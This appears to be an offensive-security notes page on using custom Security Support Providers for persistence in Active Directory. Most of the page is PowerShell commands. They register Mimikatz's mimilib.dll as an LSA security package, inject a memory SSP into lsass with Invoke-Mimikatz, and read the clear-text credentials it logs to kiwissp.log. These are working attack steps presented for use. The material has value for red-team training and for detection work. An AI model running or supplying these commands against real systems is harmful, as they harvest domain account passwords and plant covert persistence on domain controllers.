# Custom SSPs

## <mark style="color:red;">SSP</mark>

A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. here we are using custom SSPs for persistence in Active Directory with Mimikatz.

Mimikatz provdes custom SSP  `mimilib.dll`, This SSP logs local logons, service account and machine aacount passwords in clear text on the target server.

```
# First way: drop mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | Select -ExpandProperty 'Security Packages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages

# Second way: using mimikatz to inject into lsass (unstable with Server 2016)
Invoke-Mimikatz -Command '"misc::memssp"'

# All logons on the DC are logged to C:\Windows\system32\kiwissp.log
Get-Content C:\Windows\system32\kiwissp.log
```
